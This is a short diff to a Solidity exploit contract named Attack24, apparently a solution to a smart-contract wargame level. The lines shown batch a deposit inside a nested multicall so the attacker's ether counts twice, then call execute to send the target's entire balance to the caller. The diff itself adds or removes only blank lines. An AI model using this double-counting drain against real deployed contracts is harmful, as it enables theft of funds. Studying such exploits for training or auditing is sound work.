@@ -33,7 +33,9 @@ contract Attack24 {
         bytes[] memory data = new bytes[](2);
         data[0] = deposit_sig;
         data[1] = multicall_sig;
+        
         target.multicall{value: address(this).balance}(data);
+        
         bytes memory transfer_sig = abi.encodeWithSignature(
             "transfer(int)",
             address(target).balance
@@ -42,7 +44,6 @@ contract Attack24 {
         target.execute(msg.sender, address(target).balance, transfer_sig);  // <-- here
         // target.setMaxBalance(uint256(uint160(msg.sender)));
      }
-
 }
 
 
